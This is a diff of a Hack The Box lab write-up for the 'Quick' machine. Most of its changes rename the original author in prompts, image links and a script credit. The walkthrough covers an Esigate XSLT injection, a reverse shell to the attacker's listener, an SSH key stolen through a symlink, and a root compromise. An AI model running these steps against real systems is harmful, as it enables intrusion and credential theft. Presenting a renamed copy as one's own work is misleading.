@@ -9,6 +9,7 @@ avatar: assets/htb/quick.png
 source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Quick
 ---
+
 ## Useful Skills and Tools
 
 ### Connecting to HTTPS through UDP \(QUIC protocol\)
@@ -39,7 +40,7 @@ htb_url: https://app.hackthebox.com/machines/Quick
 I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oN <name>` saves the output with a filename of `<name>`.
 
 ```text
-zweilos@kalimaa:~$ nmap -p- -sC -sV -oN quick.nmap <YOUR_IP>
+kac0@kalimaa:~$ nmap -p- -sC -sV -oN quick.nmap <YOUR_IP>
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-10 14:35 EDT
 Nmap scan report for <YOUR_IP>
 Host is up (0.055s latency).
@@ -63,11 +64,11 @@ Based on my Nmap scan of TCP ports, there were only two open: SSH on the default
 
 I opened a browser to see that was hosted on HTTP, and got a website which appeared to belong to a business selling broadband internet.  
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1-quick.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-quick.png)
 
 There was also a list of currently subscribed clients at `/clients.php`.  
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/4-clients.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-clients.png)
 
 The main site says "Upto 17MBps - £18 \| Upto 50MBps - £27" and because the price is in pounds it indicates that this might be a UK service provider.  Correlating the countries of the clients, the company names,  and the names on the Testimonials section gave me a potential list of users.  I also noted that only two clients \(Tim from Qconsulting and Elisa from Wink\) were from the UK and rated them as higher priority targets for potential access.
 
@@ -83,21 +84,21 @@ James (LazyCoop Pvt Ltd) - China
 
 My shortlist of potential usernames had four entries on it. 
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/2-login.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-login.png)
 
 Clicking on the "Get Started" link led to a login page at [http://<YOUR_IP>:9001/login.php](http://<YOUR_IP>:9001/login.php). I attempted to see if any of these names would give me a positive error indicating a valid username, but the form required email addresses rather than usernames so it yielded nothing.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/6-dirbuster-quick%2520%25281%2529.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/6-dirbuster-quick%2520%25281%2529.png)
 
 According to my dirbuster scan there was an exposed `db.php`, though I was not sure how to interact with it.  Navigating to that site only brought up a blank page.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/3-portal.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-portal.png)
 
 On the main page, there was a link to `portal.quick.htb`, which I added to my `hosts` file.  It seemed to be an exact copy of the first page, except for the link that led to `portal.quick.htb` was an HTTPS site that did not connect.  
 
 I did notice something interesting while viewing the requests in Burp though: there was an HTTP header that said `X-Powered-By: Esigate`.  Some research revealed that this was a webapp integration backend for the site.  My research also found that there were some vulnerabilities that could be exploited in this software, though they required an exposed form where specifically crafted requests could bypass security controls.  Unfortunately I didn't have anywhere to test for this vulnerability yet. [http://www.esigate.org/security/security-01.html](http://www.esigate.org/security/security-01.html) [https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/)
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/5-server-status.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5-server-status.png)
 
 I also noted that the apache `server-status` page was accessible, which could lead to a serious data disclosure vulnerability.  I found some exploit code to take advantage of this at [https://github.com/mazen160/server-status\_PWN](https://github.com/mazen160/server-status_PWN), but this site didn't seem to have any data exposed that could help me.
 
@@ -112,7 +113,7 @@ I recommend not scanning all 65536 ports at a time if you ever need to scan UDP,
 {% endhint %}
 
 ```text
-root@kali:/home/zweilos/htb/quick# nmap --reason -sU -Pn -A -p1-1000 -oN quick.nmap-udp <YOUR_IP>
+root@kali:/home/kac0/htb/quick# nmap --reason -sU -Pn -A -p1-1000 -oN quick.nmap-udp <YOUR_IP>
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-10 18:51 EDT
 
 Nmap scan report for quick.htb (<YOUR_IP>)
@@ -157,7 +158,7 @@ The QUIC protocol is used in HTTP/3 and utilizes UDP for a fast connectionless "
 
 This explains why the `portal.quick.htb` site had a link to an https:// site that didn't work, since the browser expects TCP:443, and most browsers do not currently support the new protocol which uses UDP. I did some looking around to see if any browsers did have support, and found [https://caniuse.com/\#feat=http3](https://caniuse.com/#feat=http3).  It seems that some browers such as Google Chrome \(or Chromium\) can enable quic in the experimental settings page at `chrome://flags`. [https://docs.google.com/document/d/1lmL9EF6qKrk7gbazY8bIdvq3Pno2Xj\_l\_YShP40GLQE/edit\#](https://docs.google.com/document/d/1lmL9EF6qKrk7gbazY8bIdvq3Pno2Xj_l_YShP40GLQE/edit#) 
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/7-quic.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/7-quic.png)
 
 It seems that some browsers such as Google Chrome \(or Chromium\) can enable QUIC in the experimental settings page at `chrome://flags`. [https://docs.google.com/document/d/1lmL9EF6qKrk7gbazY8bIdvq3Pno2Xj\_l\_YShP40GLQE/edit\#](https://docs.google.com/document/d/1lmL9EF6qKrk7gbazY8bIdvq3Pno2Xj_l_YShP40GLQE/edit#) 
 
@@ -201,7 +202,7 @@ _Since I didn't want to just live in the install directory I created an alias of
 {% endhint %}
 
 ```markup
-zweilos@kali:~/htb/quick$ curl3 --http3 https://portal.quick.htb/
+kac0@kali:~/htb/quick$ curl3 --http3 https://portal.quick.htb/
 <html>
 <title> Quick | Customer Portal</title>
 <h1>Quick | Portal</h1>
@@ -224,7 +225,7 @@ zweilos@kali:~/htb/quick$ curl3 --http3 https://portal.quick.htb/
 With this new tool I was able to download the page at [https://portal.quick.htb](https://portal.quick.htb). There were four pages listed: `index.php`, `contact`, `about`, and `docs`.  
 
 ```markup
-zweilos@kali:~/htb/quick$ curl3 --http3 https://portal.quick.htb/index.php?view=contact
+kac0@kali:~/htb/quick$ curl3 --http3 https://portal.quick.htb/index.php?view=contact
 <!DOCTYPE html>
 <html>
 <head>
@@ -265,7 +266,7 @@ zweilos@kali:~/htb/quick$ curl3 --http3 https://portal.quick.htb/index.php?view=
 The `/contact` page looked like a work in progress and had no useful information.
 
 ```markup
-zweilos@kali:~/htb/quick$ curl3 --http3 https://portal.quick.htb/index.php?view=about
+kac0@kali:~/htb/quick$ curl3 --http3 https://portal.quick.htb/index.php?view=about
 <!DOCTYPE html>
 <html>
 <head>
@@ -284,7 +285,7 @@ zweilos@kali:~/htb/quick$ curl3 --http3 https://portal.quick.htb/index.php?view=
 <div class="row">
   <div class="column">
     <div class="card">
-      <img src="https://raw.githubusercontent.com/zweilosec/htb-writeups/master//w3images/team1.jpg" alt="Jane" style="width:100%">
+      <img src="https://raw.githubusercontent.com/kac0/htb-writeups/master//w3images/team1.jpg" alt="Jane" style="width:100%">
       <div class="container">
         <h2>Jane Doe</h2>
         <p class="title">CEO & Founder</p>
@@ -296,7 +297,7 @@ zweilos@kali:~/htb/quick$ curl3 --http3 https://portal.quick.htb/index.php?view=
 
   <div class="column">
     <div class="card">
-      <img src="https://raw.githubusercontent.com/zweilosec/htb-writeups/master//w3images/team2.jpg" alt="Mike" style="width:100%">
+      <img src="https://raw.githubusercontent.com/kac0/htb-writeups/master//w3images/team2.jpg" alt="Mike" style="width:100%">
       <div class="container">
         <h2>Mike Ross</h2>
         <p class="title">Sales Manager</p>
@@ -308,7 +309,7 @@ zweilos@kali:~/htb/quick$ curl3 --http3 https://portal.quick.htb/index.php?view=
 
   <div class="column">
     <div class="card">
-      <img src="https://raw.githubusercontent.com/zweilosec/htb-writeups/master//w3images/team3.jpg" alt="John" style="width:100%">
+      <img src="https://raw.githubusercontent.com/kac0/htb-writeups/master//w3images/team3.jpg" alt="John" style="width:100%">
       <div class="container">
         <h2>John Doe</h2>
         <p class="title">Web Designer</p>
@@ -326,7 +327,7 @@ zweilos@kali:~/htb/quick$ curl3 --http3 https://portal.quick.htb/index.php?view=
 The `/about` page contained three potential users and useful email addresses: Jane Doe `jane@quick.htb`, Mike Ross `mike@quick.htb`, and John Doe `john@quick.htb`.  
 
 ```markup
-zweilos@kali:~/htb/quick$ curl3 --http3 https://portal.quick.htb/index.php?view=docs
+kac0@kali:~/htb/quick$ curl3 --http3 https://portal.quick.htb/index.php?view=docs
 <!DOCTYPE html>
 <html>
 <head>
@@ -344,11 +345,11 @@ zweilos@kali:~/htb/quick$ curl3 --http3 https://portal.quick.htb/index.php?view=
 The `/docs` page contained references to two PDF files. I downloaded them to see if I could find more juicy information.
 
 ```text
-zweilos@kali:~/htb/quick$ curl3 --http3 https://portal.quick.htb/docs/QuickStart.pdf --output quickstart.pdf
+kac0@kali:~/htb/quick$ curl3 --http3 https://portal.quick.htb/docs/QuickStart.pdf --output quickstart.pdf
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
 100  228k  100  228k    0     0   668k      0 --:--:-- --:--:-- --:--:--  666k
-zweilos@kalimaa:~/htb/quick$ curl3 --http3 https://portal.quick.htb/docs/Connectivity.pdf --output connectivity.pdf
+kac0@kalimaa:~/htb/quick$ curl3 --http3 https://portal.quick.htb/docs/Connectivity.pdf --output connectivity.pdf
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
 100 83830  100 83830    0     0   258k      0 --:--:-- --:--:-- --:--:--  257k
@@ -356,7 +357,7 @@ zweilos@kalimaa:~/htb/quick$ curl3 --http3 https://portal.quick.htb/docs/Connect
 
 Both PDFs downloaded with no issues using the new cURL tool. The document `Connectivity.pdf` contained some interesting information!
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/8-password-pdf.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/8-password-pdf.png)
 
 Apparently this broadband provider gives their customers a default password to use to log into their accounts.  I hoped that one of the clients was lazy enough to use the same password to log into the portal, and then not change it later.  
 
@@ -365,7 +366,7 @@ The file `Connectivity.pdf` also had a link that led back to the first site: `ht
 It took a little bit of guesswork to figure out how to log into the site since I couldn't see any clues that pointed to any email addresses other than the three `@quick.htb` ones. I first tried iterating through all of the names I had found while adding `@quick.htb` on the the end, but that wasn't successful. Next I decided that since they provided the company names and countries for each of the users, I could make potential email addresses out of those.
 
 ```text
-zweilos@kali:~/htb/quick$ wfuzz -w users -c -X POST -u 'http://quick.htb:9001/login.php' -d 'email=FUZZ&password=Quick4cc3$$'
+kac0@kali:~/htb/quick$ wfuzz -w users -c -X POST -u 'http://quick.htb:9001/login.php' -d 'email=FUZZ&password=Quick4cc3$$'
 
 Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
 ********************************************************
@@ -415,27 +416,27 @@ I made sure to capture the login credentials in Burp so I could easily resend th
 
 ## Initial Foothold
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/10-logged-in.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/10-logged-in.png)
 
 Now that I was logged into the portal, I had access to the `/home`, `/ticket`, and `/search` pages I had seen in my dirbuster output earlier. 
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/12-raise-ticket.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/12-raise-ticket.png)
 
 The ticketing page had an entry field that gave me a ticket number when I submitted it.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/11-ticket.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/11-ticket.png)
 
 Since I now had access to some fields that I could send input through, I decided to test out that Esigate vulnerability I had read about earlier to see if it could be exploited. It was assigned as CVE-2018-1000854. [https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/) [https://github.com/esigate/esigate/issues/209](https://github.com/esigate/esigate/issues/209) 
 
 ```text
-zweilos@kali:~/htb/quick$ python -m SimpleHTTPServer 9088
+kac0@kali:~/htb/quick$ python -m SimpleHTTPServer 9088
 Serving HTTP on 0.0.0.0 port 9088 ...
 <YOUR_IP> - - [11/Aug/2020 21:15:36] "GET /evil.xsl HTTP/1.1" 200 -
 ```
 
 I followed the instructions in the blog and crafted an XSL file, which contained specially formed XML code that would be read and executed by Esigate when reflected into an XML file.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/18-im-in.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/18-im-in.png)
 
 I submitted the above code into the ticketing system, which caused Esigate to load the `evil.xml` file with my code from the `evil.xsl` code reflected into it as a "stylesheet". 
 
@@ -457,14 +458,14 @@ xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
 </xsl:stylesheet>
 ```
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/18.5-im-in.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/18.5-im-in.png)
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/19-ticket.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/19-ticket.png)
 
 After some testing I found that the vulnerability indeed existed in the ticket search function!  After submitting my "ticket" to the system searching for the ticket number caused the code in the malicious XML file to be read and executed by Esigate.
 
 ```text
-zweilos@kali:~/htb/quick$ python -m SimpleHTTPServer 9088
+kac0@kali:~/htb/quick$ python -m SimpleHTTPServer 9088
 Serving HTTP on 0.0.0.0 port 9088 ...
 <YOUR_IP> - - [11/Aug/2020 21:35:46] code 404, message File not found
 <YOUR_IP> - - [11/Aug/2020 21:35:46] "GET http://10.10.15.57:9088/evil.xsl HTTP/1.1" 404 -
@@ -487,7 +488,7 @@ Serving HTTP on 0.0.0.0 port 9088 ...
 After quite a bit of head-scratching and testing, I found that I could only use a specific filename once. After that it caused a 404 error for even files that definitely exist on my locally hosted python server. I wasn't sure what was going on but it must have been something the server was doing.
 
 ```text
-zweilos@kali:~/htb/quick$ nc -lvnp 13371 > passwd
+kac0@kali:~/htb/quick$ nc -lvnp 13371 > passwd
 listening on [any] 13371 ...
 connect to [10.10.15.57] from (UNKNOWN) [<YOUR_IP>] 43030
 ```
@@ -499,7 +500,7 @@ Next I created a python script to automate the file upload and ticket search act
 ```python
 #!/usr/bin/env python3
 #coding: utf8
-#Created by zweilosec (WolfZweiler) for CVE-2018-1000854 (as exposed in HTB - quick)
+#Created by kac0 (WolfZweiler) for CVE-2018-1000854 (as exposed in HTB - quick)
 
 import requests
 from bs4 import BeautifulSoup
@@ -604,7 +605,7 @@ else:
 I ran the script with three separate ESL files.  Each were loaded with commands that would enable me to get a reverse shell.  The first send a version of `nc` that had the ability to execute commands upon connection.  The second ran `chmod +x nc` to ensure it was executable. The third contained my reverse shell command that would connect back to my machine.  I loaded up all of my files with different filenames, executed my script, and crossed my fingers hoping that everything would work.
 
 ```text
-zweilos@kali:~/htb/quick$ python3 auto-evil.py 
+kac0@kali:~/htb/quick$ python3 auto-evil.py 
 Login successful!
 
 Ticket submitted: code - 200
@@ -622,7 +623,7 @@ Check your nc listener...shell should be inbound!
 Everything looked like it completed without errors...
 
 ```text
-zweilos@kali:~/htb/quick$ python -m SimpleHTTPServer 9088
+kac0@kali:~/htb/quick$ python -m SimpleHTTPServer 9088
 Serving HTTP on 0.0.0.0 port 9088 ...
 <YOUR_IP> - - [15/Aug/2020 12:24:41] "GET /evil.xsl HTTP/1.1" 200 -
 <YOUR_IP> - - [15/Aug/2020 12:24:42] "GET /evil.xml HTTP/1.1" 200 -
@@ -636,7 +637,7 @@ Serving HTTP on 0.0.0.0 port 9088 ...
 All of my files were uploaded successfully...
 
 ```text
-zweilos@kalimaa:~/htb/quick$ nc -lvnp 13371
+kac0@kalimaa:~/htb/quick$ nc -lvnp 13371
 listening on [any] 13371 ...
 connect to [10.10.15.57] from (UNKNOWN) [<YOUR_IP>] 39638
 whoami && hostname
@@ -647,8 +648,8 @@ which python
 python -c 'import pty;pty.spawn("/bin/bash")'
 sam@quick:~$ ^Z
 [1]+  Stopped                 nc -lvnp 13371
-zweilos@kali:~/htb/quick$ stty raw -echo
-zweilos@kali:~/htb/quick$ nc -lvnp 13371
+kac0@kali:~/htb/quick$ stty raw -echo
+kac0@kali:~/htb/quick$ nc -lvnp 13371
 
 sam@quick:~$ export TERM=xterm-256color
 ```
@@ -661,7 +662,7 @@ The first thing to do after gaining access was to claim my proof.
 
 ```text
 sam@quick:~$ cat user.txt 
-b57f****bd59
+b57f************************bd59
 ```
 
 ## Path to Power \(Gaining Administrator Access\)
@@ -815,7 +816,7 @@ docker0: flags=4099 mtu 1500 inet 172.17.0.1 netmask 255.255.0.0 broadcast 172.1
 
 I tried connecting to the docker container on that IP, but was rebuffed since I had no credentials.  
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/20-index.php-internal.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/20-index.php-internal.png)
 
 Next I started looking through the website files in `/var/www` to see if there were any credentials left around, and found the email address `srvadm@quick.htb` in the `index.php` file.  This file also mentioned `db.php` which sounded like it might contain useful information.
 
@@ -827,7 +828,7 @@ $conn = new mysqli("localhost","db_adm","db_p4ss","quick");
 
 I was not disappointed.  I now had credentials to a MySQL database which I had seen running on port 3306 earlier.  
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/21-jobs.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/21-jobs.png)
 
 In the folder `/var/www/` I found a writeable folder `jobs` that was owned by root.  This is always a good indication of a privilege escalation route.   In `/var/www/printers` I also found the file `job.php` which looked promising. 
 
@@ -938,7 +939,7 @@ mysql> select * from tickets;
 
 I also found a list of the tickets that I submitted earlier...the lazy admin still hadn't gotten around to helping me with my issues!
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/22-login.php-crypt.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/22-login.php-crypt.png)
 
 for the password "hash" I found, the login.php contained this line which explained it:
 
@@ -950,7 +951,7 @@ wrote a script to crack the password using: [https://stackoverflow.com/questions
 
 ```php
 <?php
-if ($wordlist = fopen("/home/zweilos/rockyou_utf8.txt", "r")) {
+if ($wordlist = fopen("/home/kac0/rockyou_utf8.txt", "r")) {
     while ((!feof($wordlist))) {
     $pass = fgets($wordlist);
 #    echo "Trying: " . $pass;
@@ -975,7 +976,7 @@ if ($wordlist = fopen("/home/zweilos/rockyou_utf8.txt", "r")) {
 then I ran it and didn't have to wait long
 
 ```text
-zweilos@kali:~/htb/quick$ php decrypt.php
+kac0@kali:~/htb/quick$ php decrypt.php
 The password is: yl51pbx
 ```
 
@@ -989,7 +990,7 @@ Communicate with a printer with an Ethernet interface using netcat:
 php hello-world.php | nc 10.x.x.x. 9100
 ```
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/23-ports.conf.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/23-ports.conf.png)
 
 ```text
 # If you just change the port or add more ports here, you will likely also
@@ -1012,7 +1013,7 @@ While poking around in the /etc/apache2 directory I noticed the `ports.conf` fil
 
 Here was the information I was looking for! There was a virtual host on port 80 at `printerv2.quick.htb` running under user `srvadm`. This may allow me exploit that jobs folder I had found in `/var/www/html`. 
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/25-connection-reset.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/25-connection-reset.png)
 
 I added the page to my `/etc/hosts` file, but I was still blocked from accessing the page since it was on port 80 \(which was still not open to the world\).
 
@@ -1085,13 +1086,13 @@ This page looks exactly the same as the virtual hosted page `http://portal.quick
 I decided to try to create an authorized\_keys folder for `sam` and see if I could use ssh port redirection to allow me to use my browser to navigate the printer page.
 
 ```text
-sam@quick:~/.ssh$echo 'ssh-rsa AAAA<my_public_key> zweilos@kali' >> authorized_keys
+sam@quick:~/.ssh$echo 'ssh-rsa AAAA<my_public_key> kac0@kali' >> authorized_keys
 ```
 
 SSH worked, after that it I set up my port redirection tunnel. The `-L` option allows you to forward a local port to a port on the remote machine with the syntax: `-L local_socket:host:hostport`.
 
 ```text
-zweilos@kali:~/htb/quick$ ssh -L 40905:<YOUR_IP>:80 sam@quick.htb
+kac0@kali:~/htb/quick$ ssh -L 40905:<YOUR_IP>:80 sam@quick.htb
 Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
@@ -1119,31 +1120,31 @@ Last login: Sun Aug 16 18:30:27 2020 from 10.10.15.57
 sam@quick:~$
 ```
 
-I logged in successfully, now to test my port forwarding in the browser. ![](https://github.com/zweilosec/htb-writeups/tree/de76ed6e78e992dd3769f7fa850ef9167e04b2c0/linux-machines/hard/connection-reset.png) Unfortunately it didn't work, though I quickly spotted the problem. I was trying to connect to <YOUR_IP> on port 80, just from the `quick.htb` machine, which I already knew was blocked. I needed to access the site the same way I had with curl earlier, with `127.0.0.1:80`.
+I logged in successfully, now to test my port forwarding in the browser. ![](https://github.com/kac0/htb-writeups/tree/de76ed6e78e992dd3769f7fa850ef9167e04b2c0/linux-machines/hard/connection-reset.png) Unfortunately it didn't work, though I quickly spotted the problem. I was trying to connect to <YOUR_IP> on port 80, just from the `quick.htb` machine, which I already knew was blocked. I needed to access the site the same way I had with curl earlier, with `127.0.0.1:80`.
 
 ```text
-zweilos@kali:~/htb/quick$ ssh -L 40905:127.0.0.1:80 sam@quick.htb
+kac0@kali:~/htb/quick$ ssh -L 40905:127.0.0.1:80 sam@quick.htb
 ```
 
-After fixing the IP, I was able to connect to the virtual hosted page. ![](https://github.com/zweilosec/htb-writeups/tree/de76ed6e78e992dd3769f7fa850ef9167e04b2c0/linux-machines/hard/virtual_printer.png) 
+After fixing the IP, I was able to connect to the virtual hosted page. ![](https://github.com/kac0/htb-writeups/tree/de76ed6e78e992dd3769f7fa850ef9167e04b2c0/linux-machines/hard/virtual_printer.png) 
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/26-quick-redux.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/26-quick-redux.png)
 
 This led me to a login page. Since I knew that the page was running as `srvadm`, I figured the credentials must be the ones I had found for that user in the MySQL database earlier. [http://pentestmonkey.net/tools/web-shells/php-reverse-shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
 
 ### Getting a shell
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/27-printer-home.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/27-printer-home.png)
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/27-add-printer.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/27-add-printer.png)
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/28-myprinter.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/28-myprinter.png)
 
 ```text
-zweilos@kali:~/htb/quick$ nc -lvnp 9100
+kac0@kali:~/htb/quick$ nc -lvnp 9100
 listening on [any] 9100 ...
 connect to [10.10.15.57] from (UNKNOWN) [<YOUR_IP>] 33998
-zweilos@kali:~/htb/quick$ nc -lvnp 9100
+kac0@kali:~/htb/quick$ nc -lvnp 9100
 listening on [any] 9100 ...
 connect to [10.10.15.57] from (UNKNOWN) [<YOUR_IP>] 34158
 This is a testVA
@@ -1216,7 +1217,7 @@ done
 This time, instead of trying to put the contents of the SSH key in the print file, I swapped the print file with a symlink to the key. This way when the file is sent to my waiting "printer" \(nc listener\), it would send the SSH key using the permissions of `srvadm`.
 
 ```text
-zweilos@kali:~/htb/quick$ nc -lvnp 9100
+kac0@kali:~/htb/quick$ nc -lvnp 9100
 listening on [any] 9100 ...
 connect to [10.10.15.57] from (UNKNOWN) [<YOUR_IP>] 36404
 -----BEGIN RSA PRIVATE KEY-----
@@ -1253,7 +1254,7 @@ After a lot of troubleshooting I arrived at the script above and was able to ret
 ## Enumeration as `srvadm`
 
 ```text
-zweilos@kali:~/htb/quick$ ssh -i srvadm.id_rsa srvadm@quick.htb
+kac0@kali:~/htb/quick$ ssh -i srvadm.id_rsa srvadm@quick.htb
 load pubkey "srvadm.id_rsa": invalid format
 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 @         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@ -1268,8 +1269,8 @@ srvadm@quick.htb's password:
 forgot to change the permissions of the private key to 600
 
 ```text
-zweilos@kali:~/htb/quick$ chmod 600 srvadm.id_rsa 
-zweilos@kali:~/htb/quick$ ssh -i srvadm.id_rsa srvadm@quick.htb
+kac0@kali:~/htb/quick$ chmod 600 srvadm.id_rsa 
+kac0@kali:~/htb/quick$ ssh -i srvadm.id_rsa srvadm@quick.htb
 load pubkey "srvadm.id_rsa": invalid format
 Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)
 
@@ -1299,7 +1300,7 @@ srvadm@quick:~$ sudo -l
 [sudo] password for srvadm:
 ```
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/29-viminfo%2520%25281%2529.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/29-viminfo%2520%25281%2529.png)
 
 ```text
 srvadm@quick:~/.local/share/nano$cat search_history
@@ -1355,7 +1356,7 @@ Connection closed by foreign host.
 
  [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/30-printer-auth%2520%25281%2529%2520%25281%2529%2520%25281%2529%2520%25281%2529%2520%25281%2529%2520%25281%2529%2520%25281%2529%2520%25281%2529%2520%25281%2529.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/30-printer-auth%2520%25281%2529%2520%25281%2529%2520%25281%2529%2520%25281%2529%2520%25281%2529%2520%25281%2529%2520%25281%2529%2520%25281%2529%2520%25281%2529.png)
 
 ```text
 srvadm@quick:~/.cache$ ls -la
@@ -1380,7 +1381,7 @@ curl: (6) Could not resolve host: printerv3.quick.htb
 
 ```text
 first tunnel
-zweilos@kalimaa:~/htb/quick$ ssh -L 40905:<YOUR_IP>:443 -i srvadm.id_rsa srvadm@quick.htb
+kac0@kalimaa:~/htb/quick$ ssh -L 40905:<YOUR_IP>:443 -i srvadm.id_rsa srvadm@quick.htb
 then
 https://srvadm%40quick.htb:%26ftQ4K3SGde8%3F@printerv3.quick.htb/printer
 decodes to 
@@ -1399,5 +1400,5 @@ root@quick:~# whoami && uname -a
 root
 Linux quick 4.15.0-91-generic #92-Ubuntu SMP Fri Feb 28 11:09:48 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 root@quick:~# cat root.txt 
-d5d1****256a
+d5d1************************256a
 ```
